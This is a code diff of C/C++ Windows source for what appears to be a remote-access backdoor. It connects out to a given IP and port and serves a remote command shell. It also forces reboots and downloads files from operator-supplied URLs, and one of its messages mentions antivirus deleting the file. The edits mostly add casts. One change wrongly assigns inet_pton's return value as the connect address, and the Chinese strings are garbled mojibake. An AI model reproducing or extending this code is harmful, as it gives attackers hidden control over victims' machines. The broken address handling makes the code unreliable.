@@ -125,7 +125,7 @@ DWORD WINAPI CmdShellProc(LPVOID lpParam)
 	CThreadNode m_ReadNode;
 	m_ReadNode.m_Sock = m_Sock;
 	m_ReadNode.hPipe = hReadPipe;
-	SEND_FLAG(m_Sock, CMD_SHELL_FLAG);
+	SEND_FLAG(m_Sock, (void*)CMD_SHELL_FLAG);
 	HANDLE hThread = CreateThread(NULL, 0, ThreadOutputProc, &m_ReadNode, 0, &dwThreadID);
 	while (GetCmdString(m_Sock, szCmdBuf)) {
 		if (_tcslen(szCmdBuf) > 0) {
@@ -179,9 +179,9 @@ BOOL ReSetWindows(DWORD dwFlags, BOOL bForce)
 	//Get the os version;
 	OSVERSIONINFO osvi = { 0 };
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-	if (!GetVersionEx(&osvi)) {
+	/*if (!GetVersionEx(&osvi)) {
 		return FALSE;
-	}
+	}*/
 	if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) {
 		EnableShutDownPriv();
 	}
@@ -206,28 +206,28 @@ BOOL DownFileFunc(SOCKET m_Sock)
 	}
 	BOOL bRet = TRUE;
 	TCHAR szDstUrl[CMD_BUF_LEN] = { 0 }, szDstPath[CMD_BUF_LEN] = { 0 };
-	if (SendData(m_Sock, _T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄURL£º"), _tcslen(_T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄURL£º"))) > 0 && GetCmdString(m_Sock, szDstUrl)) {
-		if (SendData(m_Sock, _T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄ±£´æÂ·¾¶£º"), _tcslen(_T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄ±£´æÂ·¾¶£º"))) > 0 && GetCmdString(m_Sock, szDstPath)) {
+	if (SendData(m_Sock, (void*)_T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄURL£º"), _tcslen(_T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄURL£º"))) > 0 && GetCmdString(m_Sock, szDstUrl)) {
+		if (SendData(m_Sock, (void*)_T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄ±£´æÂ·¾¶£º"), _tcslen(_T("ÇëÊäÈëÄ¿±êÎÄ¼þµÄ±£´æÂ·¾¶£º"))) > 0 && GetCmdString(m_Sock, szDstPath)) {
 			while (CheckFileExist(szDstPath)) {
-				SendData(m_Sock, _T("ÎÄ¼þÒÑ´æÔÚÇëÖØÐÂÊäÈëÂ·¾¶£º"), _tcslen(_T("ÎÄ¼þÒÑ´æÔÚÇëÖØÐÂÊäÈëÂ·¾¶£º")));
+				SendData(m_Sock, (void*)_T("ÎÄ¼þÒÑ´æÔÚÇëÖØÐÂÊäÈëÂ·¾¶£º"), _tcslen(_T("ÎÄ¼þÒÑ´æÔÚÇëÖØÐÂÊäÈëÂ·¾¶£º")));
 				GetCmdString(m_Sock, szDstPath);
 			}
-			SendData(m_Sock, _T("ÎÄ¼þÏÂÔØÖÐ£¬ÇëÉÔµÈ¡­¡­\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØÖÐ£¬ÇëÉÔµÈ¡­¡­\r\n")));
+			SendData(m_Sock, (void*)_T("ÎÄ¼þÏÂÔØÖÐ£¬ÇëÉÔµÈ¡­¡­\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØÖÐ£¬ÇëÉÔµÈ¡­¡­\r\n")));
 			HRESULT hr = URLDownloadToFile(NULL, szDstUrl, szDstPath, 0, NULL);
 			if (hr == S_OK) {
 				if (CheckFileExist(szDstPath)) {
-					SendData(m_Sock, _T("ÎÄ¼þÏÂÔØ³É¹¦£¡\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØ³É¹¦£¡\r\n")));
+					SendData(m_Sock, (void*)_T("ÎÄ¼þÏÂÔØ³É¹¦£¡\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØ³É¹¦£¡\r\n")));
 				}
 				else {
-					SendData(m_Sock, _T("ÎÄ¼þÏÂÔØ³É¹¦£¬µ«ÊÇÎÄ¼þ²»´æÔÚ£¬ºÜ¿ÉÄÜ±»É±¶¾Èí¼þ²éÉ±£¡\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØ³É¹¦£¬µ«ÊÇÎÄ¼þ²»´æÔÚ£¬ºÜ¿ÉÄÜ±»É±¶¾Èí¼þ²éÉ±£¡\r\n")));
+					SendData(m_Sock, (void*)_T("ÎÄ¼þÏÂÔØ³É¹¦£¬µ«ÊÇÎÄ¼þ²»´æÔÚ£¬ºÜ¿ÉÄÜ±»É±¶¾Èí¼þ²éÉ±£¡\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØ³É¹¦£¬µ«ÊÇÎÄ¼þ²»´æÔÚ£¬ºÜ¿ÉÄÜ±»É±¶¾Èí¼þ²éÉ±£¡\r\n")));
 				}
 			}
 			else if (hr == INET_E_DOWNLOAD_FAILURE) {
-				SendData(m_Sock, _T("URL ²»ÕýÈ·£¬ÎÄ¼þÏÂÔØÊ§°Ü£¡\r\n"), _tcslen(_T("URL ²»ÕýÈ·£¬ÎÄ¼þÏÂÔØÊ§°Ü£¡\r\n")));
+				SendData(m_Sock, (void*)_T("URL ²»ÕýÈ·£¬ÎÄ¼þÏÂÔØÊ§°Ü£¡\r\n"), _tcslen(_T("URL ²»ÕýÈ·£¬ÎÄ¼þÏÂÔØÊ§°Ü£¡\r\n")));
 				bRet = FALSE;
 			}
 			else {
-				SendData(m_Sock, _T("ÎÄ¼þÏÂÔØÊ§°Ü£¬Çë¼ì²éURLÊÇ·ñÕýÈ·£¡\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØÊ§°Ü£¬Çë¼ì²éURLÊÇ·ñÕýÈ·£¡\r\n")));
+				SendData(m_Sock, (void*)_T("ÎÄ¼þÏÂÔØÊ§°Ü£¬Çë¼ì²éURLÊÇ·ñÕýÈ·£¡\r\n"), _tcslen(_T("ÎÄ¼þÏÂÔØÊ§°Ü£¬Çë¼ì²éURLÊÇ·ñÕýÈ·£¡\r\n")));
 				bRet = FALSE;
 			}
 		}
@@ -239,7 +239,7 @@ BOOL StartWork(SOCKET m_Sock)
 {
 	int iRet = 0;
 	TCHAR sztBuf[2] = { 0 }, szCmdBuf[CMD_BUF_LEN] = { 0 };
-	SEND_FLAG(m_Sock, CMD_SHOW_FLAG);
+	SEND_FLAG(m_Sock, (void*)CMD_SHOW_FLAG);
 	while (GetCmdString(m_Sock, szCmdBuf)) {
 		if (_tcslen(szCmdBuf) > 0) {
 			if (_tcsicmp(szCmdBuf, _T("cmdshell")) == 0) {
@@ -264,7 +264,7 @@ BOOL StartWork(SOCKET m_Sock)
 				DownFileFunc(m_Sock);
 			}
 		}
-		SEND_FLAG(m_Sock, CMD_SHOW_FLAG);
+		SEND_FLAG(m_Sock, (void*)CMD_SHOW_FLAG);
 	}
 	return 0;
 }
@@ -279,9 +279,10 @@ BOOL StartShell(UINT uPort, LPCSTR lpszIpAddr)
 	if (m_ConnectSock == INVALID_SOCKET) {
 		return FALSE;
 	}
+	struct in_addr s;
 	sockaddr_in sServer = { 0 };
 	sServer.sin_family = AF_INET;
-	sServer.sin_addr.s_addr = inet_addr(lpszIpAddr);
+	sServer.sin_addr.s_addr = inet_pton(AF_INET, lpszIpAddr, (void*)&s);
 	sServer.sin_port = htons(uPort);
 
 	int iRet = 0;
